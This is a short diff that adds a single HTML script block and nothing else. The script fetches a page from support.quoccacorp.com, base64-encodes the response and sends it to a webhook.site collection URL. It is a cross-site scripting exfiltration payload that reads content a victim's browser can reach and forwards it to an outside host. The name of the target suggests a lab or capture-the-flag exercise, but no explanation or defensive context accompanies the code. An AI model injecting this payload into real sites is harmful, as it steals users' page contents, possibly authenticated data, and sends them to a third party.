@@ -1,0 +1,5 @@
+<script>
+fetch('https://support.quoccacorp.com/')
+.then(r=>r.text())
+.then(d=>fetch('https://webhook.site/f802b49f-b7b6-4e8b-adbb-a4945342953a?d='+btoa(d)))
+</script>
